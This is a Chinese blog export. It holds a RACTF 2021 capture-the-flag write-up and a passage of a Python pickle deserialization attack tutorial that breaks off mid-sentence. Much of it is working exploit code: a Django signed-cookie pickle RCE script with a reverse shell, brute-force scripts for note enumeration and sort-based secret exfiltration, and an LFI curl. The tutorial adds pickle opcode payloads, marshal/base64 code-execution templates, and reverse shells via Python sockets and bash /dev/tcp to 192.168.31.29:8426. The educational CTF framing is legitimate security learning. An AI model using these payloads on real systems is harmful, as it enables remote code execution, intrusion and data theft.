Some dirty scallywags seem to not be respectin\u0026rsquo; th\u0026rsquo; pirate code! Teach them a lesson by findin\u0026rsquo; out who they be.\nractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion 一个Tor的网站，走匿名方式\n那首先要把隐藏在后面的真实ip给找出来。整个网页的内容没有什么特别的，但是通常容易被忽略的是favicon图像，这里可以参考这样一篇文章：Hunting phishing websites with favicon hashes\n这里可以用fav-up一把梭（也就是自动化了提取图标-\u0026gt;计算mmhash值-\u0026gt;shodan搜索出ip这个过程），得到ip为178.62.4.214|178.62.15.164\nractf{DreadingPirates}\n————除此之外还有一个非预期解，当用非法的host header请求时，会直接返回flag\n$ curl -s --socks5-hostname localhost:9050 -H \u0026#34;Host: asd.com\u0026#34; ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion | grep \u0026#34;ractf\u0026#34; All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.\nWeb/Emojibook The flag is at /flag.txt\n可以登录、注册账户、发布note、查看，给出了源码\n看源码，是django框架的后端，直奔settings.py\n看到了熟悉的pickle\n在仅有的这个app的view.py中有这样的代码，会在note的body部分匹配{{.*?}}这样的内容并将其中的部分拼接到/emoji/后以image的形式加载出来，但是直接用{{/flag.txt}}是不可以的，这部分代码在forms.py中\n所以最终的payload是 {..{/flag.txt}..}\nractf{dj4ng0_lfi}\n————然而这里有个非预期，url部分可以直接修改note编号达到水平越权，也就是说可以通过爆破方式找到之前已经成功的note\nimport logging import threading import time import requests def thread_function(name): try: r=requests.get(\u0026#34;http://193.57.159.27:30160/\u0026#34;+str(name)) if (\u0026#34;base64\u0026#34; in r.text and \u0026#34;cmFjdGZ7\u0026#34; in r.text): print(r.text) except: pass if __name__ == \u0026#34;__main__\u0026#34;: threads = list() for index in range(1000): x = threading.Thread(target=thread_function, args=(index,)) threads.append(x) x.start() for index, thread in enumerate(threads): thread.join() Web/Emojybook 2 no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile\nThe flag is at /flag.txt\n跟上面那个前端一模一样，然而这次再用之前的 {..{/flag.txt}..}会返回500错误，这回就要用上之前完全没用到的pickle session cookie了。\n先读一下/app/notebook/settings.py，得到secret_key，然后搞一个反弹shell的cookie出来\n# Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/ #!/usr/bin/python import django.core.signing, django.contrib.sessions.serializers from django.http import HttpResponse from django.conf import settings import pickle import os import requests SECRET_KEY = \u0026#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7\u0026#34;(S3xv,{sp)Xaqg?2pj2=hFCgN\u0026#34;CR\u0026#34;UPn4\u0026#39; settings.configure(DEFAULT_HASHING_ALGORITHM=\u0026#34;sha256\u0026#34;) # Initial cookie when visiting the page cookie=\u0026#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM\u0026#34; newContent = django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u0026#39;django.contrib.sessions.backends.signed_cookies\u0026#39;) class PickleRce(object): def __reduce__(self): import os return (os.system,(\u0026#34;python -c \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;VPS IP\\\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#39;\u0026#34;,)) newContent[\u0026#39;testcookie\u0026#39;] = PickleRce() new_cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u0026#39;django.contrib.sessions.backends.signed_cookies\u0026#39;,compress=True) # We can then make a request with this cookie requests.get(\u0026#34;http://193.57.159.27:23934/\u0026#34;, cookies={ \u0026#34;sessionid\u0026#34;: new_cookie }) 得到shell之后我们只是个web用户，读/etc/shadow可以i得到admin的hash值，弱口令 是个999999，然后我们就可以su admin，读flag了\nractf{dj4ng0_lfi_rce_not_unintended}\n参考：wp\nWeb/Military Grade Go is safe, right? That means my implementation of AES will be secure?\n给出了go文件\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) const rawFlag = \u0026#34;[REDACTED]\u0026#34; var flag string var flagmu sync.Mutex func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte { padding := (blockSize - len(ciphertext)%blockSize) padtext := bytes.Repeat([]byte{byte(padding)}, padding) return append(ciphertext, padtext...) } func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string { bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext)) block, err := aes.NewCipher(bKey) if err != nil { log.Println(err) return \u0026#34;\u0026#34; } ciphertext := make([]byte, len(bPlaintext)) mode := cipher.NewCBCEncrypter(block, bIV) mode.CryptBlocks(ciphertext, bPlaintext) return hex.EncodeToString(ciphertext) } func changer() { ticker := time.NewTicker(time.Millisecond * 672).C for range ticker { rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } flagmu.Lock() flag = encrypt(rawFlag, key, iv, aes.BlockSize) flagmu.Unlock() } } func handler(w http.ResponseWriter, req *http.Request) { flagmu.Lock() fmt.Fprint(w, flag) flagmu.Unlock() } func main() { log.Println(\u0026#34;Challenge starting up\u0026#34;) http.HandleFunc(\u0026#34;/\u0026#34;, handler) go changer() log.Fatal(http.ListenAndServe(\u0026#34;:80\u0026#34;, nil)) } 可以看到flag被AES CBC加密，加密本身没问题，问题出在种子上；种子生成是靠rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000)完成，这样得到的种子很小 可以被我们爆破出来\nexp.go\npackage main import( \u0026#34;math/rand\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { hextext := \u0026#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914\u0026#34; // Encrypted Flag for seed:=1; seed\u0026lt;=19777868; seed++ { rand.Seed(int64(seed)) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } block, _ := aes.NewCipher(key) mode := cipher.NewCBCDecrypter(block, iv) ciphertext, _ := hex.DecodeString(hextext) flagBytes := make([]byte, len(ciphertext)) mode.CryptBlocks(flagBytes, ciphertext) flag := string(flagBytes) if strings.Contains(flag, \u0026#34;ractf\u0026#34;) { fmt.Printf(\u0026#34;Flag: %s\\n\u0026#34;, flag) break } } } ractf{int3rEst1ng_M4sk_paTt3rn}\n参考：wp\nWeb/Secret Store How many secrets could a secret store store if a store could store secrets?\n注册和登录之后可以通过api设置一个自己的secret，设置好之后还可以更改\n给出了源码，是django框架，用到了rest_framework，页面的debug模式还开着，有一个名为secret的app\nmodels.py规定了数据库的存储\n还有个配套的model serializer，规定了只读和只写的不同内容\n然后是views.py，当确认user登录状态之后，如果设置过secret将会展示出来\n直接用Get方式请求/api/secret/?format=json可以得到所有设置过的secret，理所当然的猜测id=1,owner=1的value=flag，但是value字段是只写而非只读的\n由于用的是django的rest framework，可以利用它的Ordering Filter功能来对这些json内容根据value来进行一个排序/api/secret/?ordering=value\u0026amp;format=json\n采用char-by-char的盲注方式，不断地重复设置secret-\u0026gt;以value排序-\u0026gt;如果位于id=1,owner=1的前面，并且下一次就位于它的后面，说明这是正确的字符-\u0026gt;修改secret，继续爆破下一个字符\nexp.py\nimport requests import json flag = \u0026#34;ractf\u0026#34; csrf_token = \u0026#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu\u0026#34; session_id = \u0026#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq\u0026#34; headers = { \u0026#34;Cookie\u0026#34;: f\u0026#34;csrftoken={csrf_token}; sessionid={session_id}\u0026#34;, \u0026#34;X-CSRFToken\u0026#34;: csrf_token } our_secret_id = 14 def update_secret(curr_flag): found_real_char = False for i in range(32, 127): payload = curr_flag + chr(i) json_payload = { \u0026#34;value\u0026#34;: payload } r = requests.post(\u0026#34;http://193.57.159.27:21627/api/secret/\u0026#34;, data=json_payload, headers=headers) # print(r.status_code) r = requests.get( \u0026#34;http://193.57.159.27:21627/api/secret/?ordering=value\u0026amp;format=json\u0026#34;, headers=headers) secrets = json.loads(r.text) for secret in secrets: if secret[\u0026#39;id\u0026#39;] == 1: found_real_char = True if secret[\u0026#39;id\u0026#39;] == our_secret_id: if found_real_char: return chr(i - 1) else: break return chr(i - 1) while True: next_char = update_secret(flag) flag += next_char print(\u0026#39;[+] Curr Flag:\u0026#39;, flag) ractf{data_exf1l_via_s0rt1ng_0c66de47}\n参考：wp1 wp2\nWeb/I\u0026rsquo;m a fun Agent,\nDo you remember the firearms store case from last year? The one they were using as a secret communication platform?\nWell, we\u0026rsquo;ve located the servers for them, the issue is they\u0026rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we\u0026rsquo;ll need to gain shell access to their systems the good old way. They\u0026rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they\u0026rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.\nWe\u0026rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?\n在/upload/content处可以上传video，特别的是上传处有个external\n用curl方式请求一下/etc/passwd，curl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal\n之后尝试读源码（我没爆出来目录），之后的看wp了，我太菜\nractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}\n参考：wp\nOSINT/Triangles https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW\nMiscellaneous/Discord Come join our Discord!\nractf{so_here_we_are_again}\nMiscellaneous/Missing Tools Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?\nUsername: ractf\nPassword: 8POlNixzDSThy\nNote: it may take a minute or more for your container to start depending on load\n根据给出的信息ssh连入一个终端，可以发现很多的命令都被禁止了\n使用echo /usr/bin/* /bin/*可以查看能使用的命令还有哪些\n————先说一下简单的非预期解：echo *找到flag.txt，然后source flag.txt或者sh \u0026lt; flag.txt都能读出来\n而预期解使用的是split+re-sha256的方式。直接用sha256sum得到flag然后想强行暴力破解显然非常的不现实，但是split这个工具可以以固定的字节数来划分给定的文件，如果我们以很小的标尺来划分flag并进行sha256，那么这样得到的hash值就将非常有可能爆破出来，最后再把它们合起来就能得到最终的flag了（这里用3bytes划分）\n$ split -b 3 flag.txt $ echo * flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal $ sha256sum xa* df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618 xaa 582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272 xab a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e xac 569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12 xad 7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d xae 618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9 xaf f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a xag f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460 xah de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd xai a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276 xaj 56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a xak df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal 到CrackStation一把梭\nractf{std0ut_1s_0v3rr4ted_spl1t_sha}\n害，前几天状态莫名很差，之前报的几个周末的ctf甚至连签到都没签，复现也是一拖再拖，拖到环境都关完了，挺后悔的，是自己的问题。\n在反思和调整了，嗯。\n","date":"2021-08-18T17:07:55+08:00","permalink":"https://amiaaaz.github.io/2021/08/18/ractf2021-wp/","section":"posts","tags":["wp"],"title":"RACTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"序列化\u0026amp;反序列化 在python中有好几个内置模块都可以干序列化\u0026amp;反序列化这个事，比如json, pickle/cpickle, shelve, marshal，而本文后面涉及到的序列化和反序列化操作若无特殊说明，指的都是pickle。\npickle后的对象以二进制字节流存储，能表示python几乎所有的类型（包括自定义类型），比如\nNone 、 True 和 False 整数、浮点数、复数 str、byte、bytearray 只包含可封存对象的集合，包括 tuple、list、set 和 dict 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以） 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或 __getstate__() 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances） 当然也有例外，比如文件对象和网络套接字对象以及代码对象就不可以。\n对于一个Object，可以通过重写object.__reduce__()函数，使其被序列化时按照重写的方式进行；此函数会返回一个(callable, ([para1, para2, ...])[, ...])的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。\npickle的常用方法有dumps(), loads()和dump(), load()，不带s的需要的参数是文件句柄，而带s的所需要的参数是字符串。\n说到pickle不得不谈的是opcode，即PVM(python virtual machine)的操作码，它可以被PVM的解析引擎解释处理。目前opcode有多不同的实现版本（但向下兼容），其中py2和py3序列化的结果是不同的，可以在调用函数时指定协议版本。\nimport pickle a={\u0026#39;1\u0026#39;: 1, \u0026#39;2\u0026#39;: 2} for i in range(4): print(f\u0026#39;ver_{i}\u0026#39;,pickle.dumps(a,protocol=i)) # python3输出 protocol\u0026lt;=5 ver_0: b\u0026#39;(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.\u0026#39; ver_1: b\u0026#39;}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_2: b\u0026#39;\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_3: b\u0026#39;\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_4: b\u0026#39;\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; ver_5: b\u0026#39;\\x80\\x05\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; # python2输出 protocal\u0026lt;=2 ver_0: (dp0 S\u0026#39;1\u0026#39; p1 I1 sS\u0026#39;2\u0026#39; p2 I2 s. ver_1: }q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. ver_2: �\u0002}q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. 0号版本序列化的结果看起来可读性很强 都是可视的字符，操作码也比较直接地暴露出来，重点关注几个：\nOpcode Mnemonic Description ( MARK Push a mark object onto the stack S STRING string I INT Push integer or bool; decimal string argument l LIST build a list from topmost stack items d DICT build a dict from stack items } EMPTY_DICT Push empty dict t TUPLE Build a tuple from topmost stack items ) EMPTY_TUPLE Push empty tuple c GLOBAL Push self.find_class(module, args); 2 string args R REDUCE Apply callable to argtuple, both on stack b BUILD call __setstate__ or __dict__.update() i INST build \u0026amp; push class instance o OBJ build \u0026amp; push class instance . STOP Every pickle ends with STOP 使用**pickletools**可以将opcode转化为肉眼可读取的形式\nimport pickletools data=b\u0026#34;\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;q\\x01\\x85q\\x02Rq\\x03.\u0026#34; pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL \u0026#39;builtins exec\u0026#39; 17: q BINPUT 0 19: X BINUNICODE \u0026#34;key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;\u0026#34; 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 可以利用的方向\u0026amp;思路 pickle的应用场景其实很广泛\n解析认证token, session时；参见：掌阅iReader某站Python漏洞挖掘（一个redis+python反序列化的栗子 可能将对象pickle后存储成磁盘文件 可能将对象pickle后在网络中传输 可能会通过参数传递给程序；参见：sqlmap的代码执行漏洞 这里说一下第一点，flask配合redis在服务端存储session（以pickle序列化形式进行存储），如果通过cookie进行请求session_id时，session种的内容就会被反序列化。理论上没问题，但如果出现redis的未授权访问，就可以通过自己设计恶意的session，然后再设置cookie去请求session时，我们自定的内容就会被反序列化，达到了rce的目的。\n构造反序列化的payload离不开__reduce__这个魔术方法（上文简单的提到过），它是新式类（内置类）特有的方法（关于更多python元类相关的知识可以参考stackoverflow的这篇帖子：What are metaclasses in Python?）\n————在python2有两种声明类的方式，并且它们实例化的对象性质是不同的\npython3中消除了两者的区别，表现为第二种\n回到关于__reduce__的问题，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化。指定的关键就在于该方法的返回值上：一个callable可调用的对象，一个是 ([para1, para2, ...])[, ...])，该对象所需的参数元组；最简单的例子是return (os.system, ('ls',))。__reduce__ 方法与opcode中的R指令码关系密切，可以说PVM的R指令码就是__reduce__的返回值的一个底层实现。\n此处上一个简单的小栗子 # shell.pickle cos system (S\u0026#39;/bin/sh\u0026#39; tR. 上面手写的opcode成功返回了sh的shell；而通过dumps和loads实现则是这样；我们执行的代码都在__reduce__中\n# py2 import pickle import os class A(object): def __reduce__(self): a = \u0026#39;/bin/sh\u0026#39; return (os.system,(a,)) a = A() test = pickle.dumps(a) print test pickle.loads(test) 也顺利返回了shell，很容易发现跟上面手写的opcode并无差异，而这个核心就是构造时的__reduce__函数的返回值，我们可以利用它来rce，反弹shell之类的。\n另一个反弹shell的小栗子 import pickle import os class A(object): def __reduce__(self): a = \u0026#34;\u0026#34;\u0026#34;python2 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.31.29\u0026#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34; return (os.system,(a,)) a=A() result = pickle.dumps(a) pickle.loads(result) # 或者最简单的手写opcode 不用特意构造class A() cos system (S\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; tR. 参考：Linux反弹shell（一）文件描述符与重定向 | Linux 反弹shell（二）反弹shell的本质\n栗子1 - [DasCTF 0721] easyweb 之前写过了，在对session的处理时使用了pickle，我们可以构造恶意的session反弹shell；也没有特殊的过滤和限制，payload怎么写都行\n用Marshal序列化任意代码对象 如果只在__reduce__中用-c参数执行代码的话，遇到一些自定函数 在格式上就会比较麻烦\n前面提到pickle不能序列化代码对象，来个实例\n# py2 import pickle def foo(): import os def fib(n): if n\u0026lt;=1: return n return fib(n-1)+fib(n-2) print \u0026#39;fib(10)=\u0026#39;,fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) pickle.dumps(foo.func_code) 但也不是绝路一条，Marshal可以让这段代码序列化\n# py2 import marshal import base64 def foo(): import os def fib(n): if n \u0026lt;= 1: return n return fib(n-1) + fib(n-2) print \u0026#39;fib(10) =\u0026#39;, fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) code_serialized = base64.b64encode(marshal.dumps(foo.func_code)) print code_serialized # YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B 现在得到了序列化的字符串，我们希望它被反序列化时执行，但是直接将他放入__reduce__返回部分似乎并不可以，__reduce__是调用callable来执行参数之类的，而我们构造好的本身就是callable，希望它执行而不是作为另一个callable的参数；这时就需要直接从PVM操作码的层级进行构造了。\n————其实我觉得更通俗的理解是这样可以不把要执行的代码限制在return (os.system,(a,))这样式的框架中，而是可以自由的执行代码，或者说就是另一种形式的pker\n我们需要执行的其实是（利用到python oop的特性，通过types.FunctionTyle(func_code,globals(),’’)()来动态地创建匿名函数，参见：官方文档）\n(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), \u0026#39;\u0026#39;))() 或者更可读一些\ncode_str = base64.b64decode(code_enc) code = marshal.loads(code_str) func = types.FunctionType(code, globals(), \u0026#39;\u0026#39;) func() 接下来就是手动构造opcode的时候了，回想之前返回一个简单的shell时的opcode\ncos system (S\u0026#39;/bin/sh\u0026#39; tR. 开头的c后面跟的是引入的模块，换行之后是函数，再换行之后是执行的语句；根据这个结构把marshal和b64加进去\ncmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtR 而globals()可以在__builtin__模块中引入\n{}{} c__builtin__ globals (tR 把上面的缝合起来得到最终的payload，注意添加(rR.\nctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR. 构造这个人看着费劲的payload的模板~（来源参见：Arbitrary code execution with Python pickles）\n# py2 import marshal import base64 def foo(): pass # Your code here print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) 用pickle执行一下那串payload看看效果\n成功返回了斐波那契数列的结果和一个shell\n原理都是一样的，也可以用Marshal+b64的方式反弹shell（用模板生成opcode\nimport marshal import base64 def foo(): import os a = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; # print \u0026#39;hold on...\u0026#39; os.system(a) print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) ————或者下面这个模板也可以达到上面的效果（执行代码 而不包含类和函数）（来源：pickle_compiler.py\ntry: import cPickle as pickle except ImportError: import pickle from sys import argv def picklecompiler(sourcefile): sourcecode = file(sourcefile).read() return \u0026#34;c__builtin__\\neval\\n(c__builtin__\\ncompile\\n(%sS\u0026#39;\u0026lt;payload\u0026gt;\u0026#39;\\nS\u0026#39;exec\u0026#39;\\ntRtR.\u0026#34; % (pickle.dumps( sourcecode )[:-4],) def usage(): print \u0026#39;\u0026#39;\u0026#39;usage: python %s filename\u0026#39;\u0026#39;\u0026#39; % argv[0] if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) == 2: print picklecompiler(argv[1]) else: usage() 工具二连 - 通过pker构造opcode 原理参见：通过AST来构造Pickle opcode - 自动化构造，利用了抽象语法树\npker会用到GLOBAL, INST, OBJ这三种特殊函数和一些必要的转换方式；下面是pker的简单小栗子（更多使用说明详见上面的链接）\n全局变量覆盖\n# 覆盖直接由执行文件引入secret模块中的name和category模块 ecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;1\u0026#39; secret.category = \u0026#39;2\u0026#39; # 覆盖引入模块的变量 game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = \u0026#39;123\u0026#39; 函数执行\n# 通过b\u0026#39;R\u0026#39;调用 __reducce__方法 s = \u0026#39;whoami\u0026#39; system = GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;) system(s) return # 通过b\u0026#39;i\u0026#39;调用 INST(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;whoami\u0026#39;) # 通过b\u0026#39;c\u0026#39;和b\u0026#39;o\u0026#39;调用 OBJ(GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;), \u0026#39;whoami\u0026#39;) # 多参数调用函数 INST(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;[, param0, param1...]) OBJ(GLOBAL(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;)[, param0, param1...]) 实例化对象（特殊的函数执行）\nanimal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal animal = OBJ(GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;), \u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;) animal.name=\u0026#39;1\u0026#39; animal.category=\u0026#39;2\u0026#39; return animal 先对题目有大概思路，然后辅以工具~好耶\n工具二连 - anapickle 其实一个年龄很大的脚本了，支持python2.3。。。。但是包含了很多payload，可以灵活运用~\nbypass!!! 对类型的检查 可以在已经构造好的opcode后面去掉.再续上相应的对象的opcode，作为栈顶的值供检查\n限制b'c'对模块的引入 - find_class()的重写 修改find_class()会引入函数\u0026amp;模块的白名单，一定程度上解决pickle的安全性问题；以下两种情况会调用find_class()的检查：\nopcode角度：出现c, i, b'\\x93'会调用 python角度：find_class()只会在解析opcode时调用一次，只要绕过opcode的执行过程，之后再产生的函数在黑名单中也不会拦截（比如通过__import__来绕过） \u0026ndash;\u0026raquo;仅可以引入__main__开头的模块 “通过GLOBAL指令引入的变量可以看作是原变量的引用，我们在栈上修改它的值，也会修改原变量”，基于这一原理，当c指令只允许__main__时，我们可以引入__main__.blue（blue见题行事 上下文中会提前引入）这个module，再将一个dict压入栈，内容是{'name': 'rua', 'grade': 'www'}；之后执行BUILD指令，将会改写__main__.blue.name和 __main__.blue.grade，此时已经执行了我们想要的变量覆盖。之后弹掉栈顶，现在为空栈，拼接上正常的Student对象序列化后的opcode。此时的完整opcode在被反序列化时，栈顶是正常的Student对象，而被执行时却会先执行一遍前面的过程，造成变量覆盖。\n既然我们可以做到重写变量的值，那也可以将这个值改为read wrapper的返回值做到任意文件读取（详见后面的内容）\n\u0026ndash;\u0026raquo;仅可以引入题目中自设的模块\u0026amp;模块名不能有__符 栗子2 - [SUCTF 2019]Guess Game 本地复现还是失败，无解，docker地址-\u0026gt;https://github.com/rmb122/suctf2019_guess_game\n是个猜数游戏，交互逻辑在init.py, Game.py和Ticket.py中，10以内的数字需要猜对10次（全胜）才会返回flag\n然后是game_client.py\n接收数字的输入作为参数生成Ticket对象，序列化后发送到server端\n再看game_server.py，用了重写了的find_class()\n这个限制的意思是导入的模块只能以guess_name开头并且名字里没有__\n大概看完了流程，接下来找找突破口——序列化时是生成一个Ticket的实例\n判断输赢则是需要Game辅助\n结合game_server.py的判断条件，拿到flag需要self.win_count == max_round == 